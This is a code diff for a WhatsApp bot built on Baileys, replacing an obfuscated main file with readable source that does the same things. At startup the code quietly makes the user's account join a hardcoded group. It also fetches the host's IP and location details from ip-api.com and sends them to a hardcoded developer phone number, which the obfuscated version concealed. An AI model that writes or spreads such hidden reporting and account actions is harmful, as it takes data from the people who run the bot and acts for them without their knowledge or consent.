@@ -1,1 +1,197 @@
-const _0x146f3a=_0x2271;(function(_0x5e6ac5,_0x42082b){const _0x401d1c=_0x2271,_0xfc638d=_0x5e6ac5();while(!![]){try{const _0x2d85fe=parseInt(_0x401d1c(0xe7))/0x1+-parseInt(_0x401d1c(0xe5))/0x2+-parseInt(_0x401d1c(0xf9))/0x3*(-parseInt(_0x401d1c(0xd4))/0x4)+-parseInt(_0x401d1c(0x145))/0x5+parseInt(_0x401d1c(0xe3))/0x6*(-parseInt(_0x401d1c(0xd2))/0x7)+-parseInt(_0x401d1c(0x147))/0x8+-parseInt(_0x401d1c(0x13f))/0x9*(-parseInt(_0x401d1c(0x136))/0xa);if(_0x2d85fe===_0x42082b)break;else _0xfc638d['push'](_0xfc638d['shift']());}catch(_0x2f3dd7){_0xfc638d['push'](_0xfc638d['shift']());}}}(_0x2734,0x2b7df));function _0x2734(){const _0x13e463=['buttonsMessage','value','warn','owner','desc','prepareMessage','promote','SUBSCRIBE\x20YT\x20-\x20[PEPE\x20-\x20SIR]','*[\x20GÊ€á´á´œá´˜\x20Sá´‡á´›á´›ÉªÉ´É¢s\x20CÊœá´€É´É¢á´‡\x20]*\x0a','Battery\x20:\x20','text','191030glbcYm','[\x20Group\x20Closed\x20]\x20In\x20','./lib/myfunc','jid','./ds.jpg','```\x0aâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€','ðŸŒ¹\x20ð‘·\x20ð‘¬\x20ð‘·\x20ð‘¬\x20-\x20ð‘º\x20ð‘¬\x20ð‘¹\x20ðŸŒ¹','query','Standard','216RZODys','â”€â”€â”€â”€â”€ã€Œ\x20*IP-USER*\x20ã€â”€â”€â”€â”€â”€\x0a\x0a```','Please\x20scan\x20qr\x20code','*[\x20GÊ€á´á´œá´˜\x20CÊŸá´sá´‡á´…\x20]*\x0a','participants','CB:action,,battery','1155850qWssxA','base64EncodedAuthInfo','418104KElgzF','readFileSync','stringify','group-participants-update','false','sendMessage','browserDescription','hehe','7aDDeHb','./lib/color','196hjTRkK','demote','yellow','announce','chat-update','0@s.whatsapp.net','Sending\x20bot\x20info\x20to\x20bot\x20owner','./lib/loader','parse','writeFileSync','split','6288213840883-1616169743@g.us','groupMetadata','http://ip-api.com/line','locationMessage','961446bnrkns','BOT\x20RUNNING','653102PBmMOl','invite','167231yRSnBI','cyan','./message/help.js','red','batrei','https://wa.me/917736622139?text=Hi\x20bro','default','logger','@s.whatsapp.net','[SER]','Who\x20Is\x20the\x20Bledy\x20Fool\x20ðŸ™‚','level','batteryLevelStr','textSync','action','replace','Connecting...','batterylevel','19755wMuFuf','|WRN|','mememteeeekkeke','WELCOME','PHOTO','[DENIS]','Sending\x20ip\x20address\x20to\x20developer\x20bot','*[\x20GÊ€á´á´œá´˜\x20Sá´‡á´›á´›ÉªÉ´É¢\x20CÊœá´€É´É¢á´‡\x20]*\x0a','Congrats\x20ðŸ¥³','./message/group','*[\x20GÊ€á´á´œá´˜\x20Oá´˜á´‡É´á´‡á´…\x20]*\x0a','*ð™·ðš’\x20ðš‹ðš›ðš˜\x20,\x20ð™±ð™¾ðšƒ\x20ð™¸ðš‚\x20ð™²ð™¾ð™½ð™½ð™´ð™²ðšƒð™´ð™³\x20ð™¸ð™½\x20ðšˆð™¾ðš„ðš\x20ð™½ðš„ð™¼ð™±ð™´ðš*\x0aâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\x0a```','*[\x20GÊ€á´á´œá´˜\x20DÉªsá´„Ê€Éªá´˜á´›Éªá´É´\x20CÊœá´€É´É¢á´‡\x20]*\x0a\x0a\x20â€¢\x20*É´á´‡á´¡*\x20:\x20*','getProfilePicture','17247805970@s.whatsapp.net','unknown','[WATCH]','message','[\x20Group\x20Opened\x20]\x20In\x20','node-fetch','blue','*Yá´á´œ\x20AÊ€á´‡\x20Ná´á´¡\x20AÉ´\x20Aá´…á´ÉªÉ´*\x0a\x20@','./setting.json','location','./Bosco.js','ds.jpg','ð™²ðš›ðšŽðšŠðšðš˜ðš›\x20pepe\x20','../Bosco.js','BOSCO\x20BY\x20PEPE','@c.us','figlet','../message/help.js','https://i.ibb.co/rvsVF3r/5012fbb87660.png','[\x20Group\x20Setting\x20Change\x20]\x20In\x20','true','[\x20Group\x20Description\x20Change\x20]\x20In\x20','then','descOwner','loadAuthInfo','./Denis.json','File\x20is\x20updated!','ephemeralMessage','subject','connect','connecting','white','restrict','Error\x20:\x20%s','log','live'];_0x2734=function(){return _0x13e463;};return _0x2734();}const {WAConnection,MessageType,Presence,MessageOptions,Mimetype,WALocationMessage,WA_MESSAGE_STUB_TYPES,ReconnectMode,ProxyAgent,GroupSettingChange,waChatKey,mentionedJid,processTime,processTicksAndRejections,ECONNABORTED,apikey,WA_DEAFULT_EPHEMERAL,DataView,TypedArray,device,Browser}=require('@adiwajshing/baileys'),{color,bgcolor}=require(_0x146f3a(0xd3)),fs=require('fs-extra'),figlet=require(_0x146f3a(0x117)),clc=require('chalk'),{sleep,start,success}=require(_0x146f3a(0x138)),{uncache,nocache}=require(_0x146f3a(0xdb)),setting=JSON[_0x146f3a(0xdc)](fs[_0x146f3a(0x148)](_0x146f3a(0x10f))),welcome=require(_0x146f3a(0x102)),fetch=require(_0x146f3a(0x10c)),{getBuffer}=require(_0x146f3a(0x138));baterai=_0x146f3a(0x108),charging='unknown',require(_0x146f3a(0x111)),nocache(_0x146f3a(0x114),_0x445b1d=>console[_0x146f3a(0x129)](color(_0x146f3a(0x109),'cyan'),color('\x27'+_0x445b1d+'\x27','green'),_0x146f3a(0x121))),require(_0x146f3a(0xe9)),nocache(_0x146f3a(0x118),_0x1c42e3=>console['log'](color(_0x146f3a(0x109),'cyan'),color('\x27'+_0x1c42e3+'\x27','green'),_0x146f3a(0x121)));function _0x2271(_0x556b1b,_0x32c1bf){const _0x273499=_0x2734();return _0x2271=function(_0x227110,_0x5ef075){_0x227110=_0x227110-0xd0;let _0x5baf68=_0x273499[_0x227110];return _0x5baf68;},_0x2271(_0x556b1b,_0x32c1bf);}const starts=async(_0x5bb613=new WAConnection())=>{const _0x480b74=_0x146f3a;_0x5bb613[_0x480b74(0xee)][_0x480b74(0xf2)]=_0x480b74(0x12d),console[_0x480b74(0x129)](color(figlet[_0x480b74(0xf4)](_0x480b74(0x115),{'font':_0x480b74(0x13e),'horizontalLayout':_0x480b74(0xed),'vertivalLayout':_0x480b74(0xed),'width':0x50,'whitespaceBreak':![]}),'yellow')),console['log'](color(_0x480b74(0xfe),'cyan'),color(_0x480b74(0xfc),_0x480b74(0x126))),console['log'](color(_0x480b74(0xf0),_0x480b74(0xe8)),color(_0x480b74(0xe4),_0x480b74(0xd6))),_0x5bb613[_0x480b74(0xd0)]=[_0x480b74(0x132),'firefox','3.0.0'],_0x5bb613['on']('qr',()=>{const _0x312716=_0x480b74;console['log'](color('[',_0x312716(0x126)),color('!',_0x312716(0xea)),color(']',_0x312716(0x126)),color(_0x312716(0x141)));}),fs['existsSync'](_0x480b74(0x120))&&_0x5bb613[_0x480b74(0x11f)](_0x480b74(0x120)),_0x5bb613['on'](_0x480b74(0x125),()=>{const _0x4d5c10=_0x480b74;start('2',_0x4d5c10(0xf7),'red');}),_0x5bb613['on']('open',()=>{success('2','Connected');}),await _0x5bb613[_0x480b74(0x124)]({'timeoutMs':0xa*0x3e8}),fs[_0x480b74(0xdd)](_0x480b74(0x120),JSON[_0x480b74(0x149)](_0x5bb613[_0x480b74(0x146)](),null,'\x09')),teks='https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m',_0x5bb613[_0x480b74(0x13d)]({'json':[_0x480b74(0xf5),_0x480b74(0xe6),''+teks[_0x480b74(0xf6)]('https://chat.whatsapp.com/','')]}),console[_0x480b74(0x129)](color('|WRN|','yellow'),color('Ç«Ê€\x20Éªs\x20Ê€á´œÉ´ÉªÉ´É¢',_0x480b74(0x10d))),_0x5bb613['sendMessage'](setting[_0x480b74(0x12e)]+'@s.whatsapp.net',_0x480b74(0x104)+JSON[_0x480b74(0x149)](_0x5bb613['user'],null,0x2)+'```\x0aâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\x0a*ð™¸ðš\x20ðšðš‘ðšŽðš›ðšŽ\x20ðšŠðš—ðš¢\x20ðšŽðš›ðš›ðš˜ðš›/ðš™ðš•ðšŽðšŠðšœðšŽ\x20ðšŒðš˜ðš—ðšðšŠðšŒðš\x20ð™±ðš˜ðš\x20ðš˜ðš ðš—ðšŽðš›,\x20ðšƒðš‘ðšŠðš—ðš”\x20ðš¢ðš˜ðšž\x20ðšðš˜ðš›\x20ðšŒðš‘ðš˜ðš˜ðšœðš’ðš—ðš\x20ðš–ðš¢\x20ðš‹ðš˜ðš*',MessageType[_0x480b74(0x135)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':_0x480b74(0x113),'body':'','previewType':'PHOTO','thumbnail':fs[_0x480b74(0x148)](_0x480b74(0x13a)),'sourceUrl':_0x480b74(0xec)}}}),console[_0x480b74(0x129)](color(_0x480b74(0xfa),'yellow'),color(_0x480b74(0xda),'blue')),fetch(_0x480b74(0xe1))[_0x480b74(0x11d)](_0x51d1ad=>_0x51d1ad[_0x480b74(0x135)]())[_0x480b74(0x11d)](_0x4a6a99=>{const _0x18650e=_0x480b74;_0x5bb613[_0x18650e(0x14c)](_0x18650e(0x107),_0x18650e(0x140)+_0x4a6a99+_0x18650e(0x13b),MessageType[_0x18650e(0x135)],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'Developer\x20pepe\x20ser','body':'','previewType':_0x18650e(0xfd),'thumbnail':fs[_0x18650e(0x148)]('./ds.jpg'),'sourceUrl':_0x18650e(0xec)}}}),console[_0x18650e(0x129)](color('|WRN|',_0x18650e(0xd6)),color(_0x18650e(0xff),_0x18650e(0xea)));}),_0x5bb613['on'](_0x480b74(0x144),_0x1c5ea5=>{const _0x3bee30=_0x480b74;global[_0x3bee30(0xf3)]=_0x1c5ea5[0x2][0x0][0x1][_0x3bee30(0x12c)],global[_0x3bee30(0xf8)]=parseInt(batteryLevelStr),baterai=batterylevel;if(_0x1c5ea5[0x2][0x0][0x1][_0x3bee30(0x12a)]=='true')charging=!![];if(_0x1c5ea5[0x2][0x0][0x1][_0x3bee30(0x12a)]==_0x3bee30(0x14b))charging=![];console[_0x3bee30(0x129)](_0x1c5ea5[0x2][0x0][0x1]),console['log'](_0x3bee30(0x134)+batterylevel+'%');}),global[_0x480b74(0xeb)]=global[_0x480b74(0xeb)]?global[_0x480b74(0xeb)]:[],_0x5bb613['on'](_0x480b74(0x144),_0x2c1468=>{const _0x2f24c3=_0x480b74,_0x3d517c=_0x2c1468[0x2][0x0][0x1][_0x2f24c3(0x12c)],_0x4741a3=parseInt(_0x3d517c);global[_0x2f24c3(0xeb)]['push'](_0x4741a3);}),_0x5bb613['on']('message-delete',async _0xb37d97=>{await _0xb37d97(_0xb37d97);}),_0x5bb613['on'](_0x480b74(0x14a),async _0x1f4b5e=>{const _0x158393=_0x480b74;await welcome(_0x5bb613,_0x1f4b5e);try{const _0x19fd63=await _0x5bb613[_0x158393(0xe0)](_0x1f4b5e[_0x158393(0x139)]);console[_0x158393(0x129)](_0x1f4b5e);if(_0x1f4b5e[_0x158393(0xf5)]==_0x158393(0x131)){num=_0x1f4b5e[_0x158393(0x143)][0x0];try{ppimg=await _0x5bb613[_0x158393(0x106)](_0x1f4b5e['participants'][0x0][_0x158393(0xde)]('@')[0x0]+_0x158393(0x116));}catch{ppimg=_0x158393(0x119);}let _0x55e9ae=await getBuffer(ppimg);const _0xda146b=await _0x5bb613['prepareMessage'](_0x158393(0xd9),_0x55e9ae,MessageType[_0x158393(0x110)],{'thumbnail':_0x55e9ae}),_0x8700be=_0xda146b['message'][_0x158393(0x122)]?_0xda146b[_0x158393(0x10a)][_0x158393(0x122)]:_0xda146b;teks=_0x158393(0x10e)+num[_0x158393(0xde)]('@')[0x0]+'\x0a',promoteBut=[{'buttonId':'hm','buttonText':{'displayText':_0x158393(0x101)},'type':0x1}],promoteButt={'contentText':''+teks,'footerText':'Thank\x20You\x20So\x20Much\x20ðŸŒâ¤ï¸','buttons':promoteBut,'headerType':0x6,'locationMessage':_0x8700be[_0x158393(0x10a)][_0x158393(0xe2)]},_0x5bb613[_0x158393(0x14c)](_0x19fd63['id'],promoteButt,MessageType[_0x158393(0x12b)],{'caption':_0x158393(0xd1),'contextInfo':{'mentionedJid':[num]}});}else{if(_0x1f4b5e[_0x158393(0xf5)]==_0x158393(0xd5)){num=_0x1f4b5e[_0x158393(0x143)][0x0];const _0x34274c=await _0x5bb613[_0x158393(0xe0)](_0x1f4b5e[_0x158393(0x139)]);try{ppimg=await _0x5bb613[_0x158393(0x106)](_0x1f4b5e[_0x158393(0x143)][0x0]['split']('@')[0x0]+_0x158393(0x116));}catch{ppimg='https://i.ibb.co/rvsVF3r/5012fbb87660.png';}let _0x274e71=await getBuffer(ppimg);const _0x2963fb=await _0x5bb613[_0x158393(0x130)](_0x158393(0xd9),_0x274e71,MessageType['location'],{'thumbnail':_0x274e71}),_0x183f26=_0x2963fb[_0x158393(0x10a)]['ephemeralMessage']?_0x2963fb[_0x158393(0x10a)]['ephemeralMessage']:_0x2963fb;teks='*Yá´á´œ\x20AÊ€á´‡\x20Ná´\x20Lá´É´É¢á´‡Ê€\x20AÉ´\x20Aá´…á´ÉªÉ´*\x0a\x20@'+num[_0x158393(0xde)]('@')[0x0]+'\x0a',demoteBut=[{'buttonId':'hm','buttonText':{'displayText':'Next\x20Time\x20I\x20get'},'type':0x1}],demoteButt={'contentText':''+teks,'footerText':_0x158393(0xf1),'buttons':demoteBut,'headerType':0x6,'locationMessage':_0x183f26[_0x158393(0x10a)]['locationMessage']},_0x5bb613[_0x158393(0x14c)](_0x34274c['id'],demoteButt,MessageType[_0x158393(0x12b)],{'caption':_0x158393(0xd1),'contextInfo':{'mentionedJid':[num]}});}}}catch(_0x3b84dc){console['log'](_0x158393(0x128),color(_0x3b84dc,_0x158393(0xea)));}}),_0x5bb613['on']('group-update',async _0x2e0f08=>{const _0x49f09e=_0x480b74;falfa={'key':{'fromMe':![],'participant':'0@s.whatsapp.net','remoteJid':_0x49f09e(0xd9)},'message':{'groupInviteMessage':{'groupJid':_0x49f09e(0xdf),'inviteCode':_0x49f09e(0xfb),'groupName':'Alphabot','caption':_0x49f09e(0x13c),'jpegThumbnail':fs['readFileSync'](_0x49f09e(0x112))}}},metdata=await _0x5bb613['groupMetadata'](_0x2e0f08[_0x49f09e(0x139)]);if(_0x2e0f08[_0x49f09e(0xd7)]==_0x49f09e(0x14b))teks=_0x49f09e(0x103),_0x5bb613[_0x49f09e(0x14c)](metdata['id'],teks,MessageType[_0x49f09e(0x135)],{'quoted':falfa}),console[_0x49f09e(0x129)](clc['yellow'](_0x49f09e(0x10b)+metdata[_0x49f09e(0x123)]));else{if(_0x2e0f08[_0x49f09e(0xd7)]==_0x49f09e(0x11b))teks=_0x49f09e(0x142),_0x5bb613[_0x49f09e(0x14c)](metdata['id'],teks,MessageType['text'],{'quoted':falfa}),console[_0x49f09e(0x129)](clc['yellow'](_0x49f09e(0x137)+metdata[_0x49f09e(0x123)]));else{if(!_0x2e0f08[_0x49f09e(0x12f)]=='')tag=_0x2e0f08[_0x49f09e(0x11e)][_0x49f09e(0xde)]('@')[0x0]+_0x49f09e(0xef),teks=_0x49f09e(0x105)+_0x2e0f08['desc']+'*',_0x5bb613[_0x49f09e(0x14c)](metdata['id'],teks,MessageType[_0x49f09e(0x135)],{'contextInfo':{'mentionedJid':[tag]},'quoted':falfa}),console['log'](clc['yellow'](_0x49f09e(0x11c)+metdata['subject']));else{if(_0x2e0f08['restrict']==_0x49f09e(0x14b))teks=_0x49f09e(0x133),_0x5bb613['sendMessage'](metdata['id'],teks,MessageType[_0x49f09e(0x135)],{'quoted':falfa}),console[_0x49f09e(0x129)](clc[_0x49f09e(0xd6)](_0x49f09e(0x11a)+metdata[_0x49f09e(0x123)]));else _0x2e0f08[_0x49f09e(0x127)]==_0x49f09e(0x11b)&&(teks=_0x49f09e(0x100),_0x5bb613[_0x49f09e(0x14c)](metdata['id'],teks,MessageType[_0x49f09e(0x135)],{'quoted':falfa}),console['log'](clc[_0x49f09e(0xd6)](_0x49f09e(0x11a)+metdata[_0x49f09e(0x123)])));}}}}),_0x5bb613['on'](_0x480b74(0xd8),async _0xad9f09=>{require('./Bosco.js')(_0x5bb613,_0xad9f09);});};starts();
+const {
+WAConnection,
+   MessageType,
+   Presence,
+   MessageOptions,
+   Mimetype,
+   WALocationMessage,
+   WA_MESSAGE_STUB_TYPES,
+   ReconnectMode,
+   ProxyAgent,
+   GroupSettingChange,
+   waChatKey,
+   mentionedJid,
+   processTime,
+   processTicksAndRejections,
+   ECONNABORTED,
+   apikey,
+   WA_DEAFULT_EPHEMERAL,
+   DataView,
+   TypedArray,
+   device,
+   Browser
+} = require('@adiwajshing/baileys')
+const { color, bgcolor } = require('./lib/color')
+const fs = require("fs-extra")
+const figlet = require('figlet')
+const clc = require('chalk')
+const { sleep, start, success } = require('./lib/myfunc')
+const { uncache, nocache } = require('./lib/loader')
+const setting = JSON.parse(fs.readFileSync('./setting.json'))
+const welcome = require('./message/group')
+const fetch = require("node-fetch");
+const { getBuffer } = require('./lib/myfunc')
+baterai = 'unknown'
+charging = 'unknown'
+
+
+require('./Bosco.js')
+nocache('../Bosco.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
+require('./message/help.js')
+nocache('../message/help.js', module => console.log(color('[WATCH]', 'cyan'), color(`'${module}'`, 'green'), 'File is updated!'))
+         
+    const starts = async (bosco = new WAConnection()) => {
+	bosco.logger.level = 'warn'
+	console.log(color(figlet.textSync('BOSCO BY PEPE', {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: false
+	}), 'yellow'))
+	console.log(color('[DENIS]', 'cyan'), color('WELCOME', 'white'))
+	console.log(color('[SER]', 'cyan'), color('BOT RUNNING', 'yellow'))
+	bosco.browserDescription = ["SUBSCRIBE YT - [PEPE - SIR]", "firefox", "3.0.0"];
+
+	// Menunggu QR
+	bosco.on('qr', () => {
+		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Please scan qr code'))
+	})
+
+	// Menghubungkan
+	fs.existsSync(`./Denis.json`) && bosco.loadAuthInfo(`./Denis.json`)
+	bosco.on('connecting', () => {
+		start('2', 'Connecting...','red')
+	})
+
+	//connect
+	bosco.on('open', () => {
+		success('2', 'Connected')
+	})
+
+	// session
+	await bosco.connect({
+		timeoutMs: 10 * 1000
+	})
+	fs.writeFileSync(`./Denis.json`, JSON.stringify(bosco.base64EncodedAuthInfo(), null, '\t'));
+ teks = `https://chat.whatsapp.com/BzhyWkAEU0t8oVl3s8p94m`
+ bosco.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
+ bosco.sendMessage(`${setting.owner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 , 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(bosco.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 pepe ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
+       bosco.sendMessage("17247805970@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer pepe ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./ds.jpg'),sourceUrl:"https://wa.me/917736622139?text=Hi bro"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
+   })
+
+	// Baterai
+	bosco.on('CB:action,,battery', json => {
+		global.batteryLevelStr = json[2][0][1].value
+		global.batterylevel = parseInt(batteryLevelStr)
+		baterai = batterylevel
+		if (json[2][0][1].live == 'true') charging = true
+		if (json[2][0][1].live == 'false') charging = false
+		console.log(json[2][0][1])
+		console.log('Battery : ' + batterylevel + '%')
+	})
+	global.batrei = global.batrei ? global.batrei : []
+	bosco.on('CB:action,,battery', json => {
+		const batteryLevelStr = json[2][0][1].value
+		const batterylevel = parseInt(batteryLevelStr)
+		global.batrei.push(batterylevel)
+	})
+	
+	  // Call Block
+	/*bosco.on('CB:action,,call', async json => {
+        const callerId = json[2][0][1].from;
+        console.log("caller "+ callerId)
+        bosco.sendMessage(callerId, "Call = BLOCK!!\nDont call me!!", MessageType.text)
+        await sleep(3000)
+        await bosco.blockUser(callerId, "add") // Block user
+   })*/
+   
+   bosco.on('message-delete', async (m) => {
+   	await m(m)
+   })
+  
+       // welcome
+	bosco.on('group-participants-update', async (anu) => {
+		await welcome(bosco, anu)
+		try { 
+           const mdata = await bosco.groupMetadata(anu.jid)
+           console.log(anu)
+		if (anu.action == 'promote'){
+			num = anu.participants[0]
+			try {
+					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+				} catch {
+					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
+				}
+			let buff = await getBuffer(ppimg)
+			const bosco1 = await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
+			teks = `*Yᴏᴜ Aʀᴇ Nᴏᴡ Aɴ Aᴅᴍɪɴ*
+ @${num.split('@')[0]}
+`
+			promoteBut = [{buttonId:`hm`,buttonText:{displayText:'Congrats 🥳'},type:1}]
+            promoteButt = { contentText: `${teks}`, footerText: `Thank You So Much 🌝❤️`, buttons: promoteBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
+            bosco.sendMessage(mdata.id, promoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+		    } else if (anu.action == 'demote') {
+			num = anu.participants[0]
+			const mdata = await bosco.groupMetadata(anu.jid)
+			try {
+					ppimg = await bosco.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+				} catch {
+					ppimg = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
+				}
+			let buff = await getBuffer(ppimg)
+			const bosco3= await bosco.prepareMessage("0@s.whatsapp.net", buff, MessageType.location,{ thumbnail: buff})
+			const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
+			teks = `*Yᴏᴜ Aʀᴇ Nᴏ Lᴏɴɢᴇʀ Aɴ Aᴅᴍɪɴ*
+ @${num.split('@')[0]}
+`
+			demoteBut = [{buttonId:`hm`,buttonText:{displayText:'Next Time I get'},type:1}]
+            demoteButt = { contentText: `${teks}`, footerText: `Who Is the Bledy Fool 🙂`, buttons: demoteBut, headerType: 6, locationMessage: bosco4.message.locationMessage}
+            bosco.sendMessage(mdata.id, demoteButt, MessageType.buttonsMessage, { caption: 'hehe', "contextInfo": { "mentionedJid" : [num], },})
+		    }
+            } catch (e) {
+         console.log('Error : %s', color(e, 'red'))
+      }
+})
+
+    bosco.on('group-update', async (anu) => {
+    falfa = { key: {fromMe: false,participant: "0@s.whatsapp.net",
+   remoteJid: "0@s.whatsapp.net"},message: {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "Alphabot", "caption": `🌹 𝑷 𝑬 𝑷 𝑬 - 𝑺 𝑬 𝑹 🌹`, 'jpegThumbnail': fs.readFileSync(`ds.jpg`)}}}
+    metdata = await bosco.groupMetadata(anu.jid)
+    if(anu.announce == 'false'){
+    teks = `*[ Gʀᴏᴜᴘ Oᴘᴇɴᴇᴅ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Opened ] In ${metdata.subject}`))
+  } else if(anu.announce == 'true'){
+    teks = `*[ Gʀᴏᴜᴘ Cʟᴏsᴇᴅ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Closed ] In ${metdata.subject}`))
+  } else if(!anu.desc == ''){
+    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+    teks = `*[ Gʀᴏᴜᴘ Dɪsᴄʀɪᴘᴛɪᴏɴ Cʜᴀɴɢᴇ ]*\n\n • *ɴᴇᴡ* : *${anu.desc}*`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: falfa})
+    console.log(clc.yellow(`[ Group Description Change ] In ${metdata.subject}`))
+ } else if(anu.restrict == 'false'){
+    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢs Cʜᴀɴɢᴇ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
+  } else if(anu.restrict == 'true'){
+    teks = `*[ Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢ Cʜᴀɴɢᴇ ]*\n`
+    bosco.sendMessage(metdata.id, teks, MessageType.text, {quoted: falfa})
+    console.log(clc.yellow(`[ Group Setting Change ] In ${metdata.subject}`))
+   }
+})
+
+    
+	bosco.on('chat-update', async (message) => {
+		require('./Bosco.js')(bosco, message)
+	})
+}
+
+starts()
